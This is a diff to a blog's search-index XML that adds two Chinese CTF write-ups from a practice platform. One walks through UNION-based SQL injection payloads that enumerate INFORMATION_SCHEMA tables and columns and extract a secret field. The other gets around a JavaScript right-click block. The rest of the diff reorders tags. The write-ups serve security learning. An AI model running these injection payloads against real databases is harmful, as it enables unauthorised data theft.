@@ -4,6 +4,56 @@
   
     
     <entry>
+      <title>NewsCenter</title>
+      <link href="/2019/11/16/NewsCenter/"/>
+      <url>/2019/11/16/NewsCenter/</url>
+      
+        <content type="html"><![CDATA[<h2 id="src-攻防世界-NewsCenter"><a href="#src-攻防世界-NewsCenter" class="headerlink" title="[src = 攻防世界] NewsCenter"></a>[src = 攻防世界] NewsCenter</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>如题目环境报错，稍等片刻刷新即可<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>题目显示一个Search news，随便输入几个数字会发现下面的显示结果变化。输入“1’”程序报错，所以基本确认存在SQLi。下面利用Union查询，测试显示对列数。<br>输入payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111<span class="string">' union select 1,2,3 #</span></span><br></pre></td></tr></table></figure><p>显示如下：</p><p><img src="./newscenter1.PNG" alt="newcenter"></p><p>发现有三列，并输出第二列和第三列。则可以利用这两列获取数据库信息，payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111111<span class="string">' union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #</span></span><br></pre></td></tr></table></figure><p>在最下面发现secret_table。然后表内信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111111<span class="string">' union select 1,column_name,data_type from information_schema.columns where table_name='</span>secret_table<span class="string">'#</span></span><br></pre></td></tr></table></figure><p>发现一个fl4g字段。然后显示该字段得到flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111111<span class="string">' union select 1,2,fl4g from secret_table #</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> WEB </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQLi </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>view_source</title>
+      <link href="/2019/11/15/view-source/"/>
+      <url>/2019/11/15/view-source/</url>
+      
+        <content type="html"><![CDATA[<h2 id="src-攻防世界-where-is-flag"><a href="#src-攻防世界-where-is-flag" class="headerlink" title="[src = 攻防世界] where is flag"></a>[src = 攻防世界] where is flag</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开题目，右键查看源代码失效。原因是js代码禁用了右键。<br>两种方法：</p><ol><li>使用F12查看；</li><li>在设置里面禁用js。</li></ol><p>以Chrome为例，在设置–&gt;隐私设置和安全性–&gt;网站设置–&gt;JavaScript设置为禁用，则就可以使用右键！查看到flag</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WEB </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cookie </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>dafuq-manager-1</title>
       <link href="/2019/11/15/dafuq-manager-1/"/>
       <url>/2019/11/15/dafuq-manager-1/</url>
@@ -452,9 +502,9 @@
       
         <tags>
             
-            <tag> AES </tag>
-            
             <tag> python </tag>
+            
+            <tag> AES </tag>
             
         </tags>
       
@@ -535,9 +585,9 @@
       
         <tags>
             
-            <tag> python </tag>
-            
             <tag> base64 </tag>
+            
+            <tag> python </tag>
             
         </tags>
       
@@ -645,9 +695,9 @@
       
         <tags>
             
-            <tag> python </tag>
-            
             <tag> base64 </tag>
+            
+            <tag> python </tag>
             
         </tags>
       
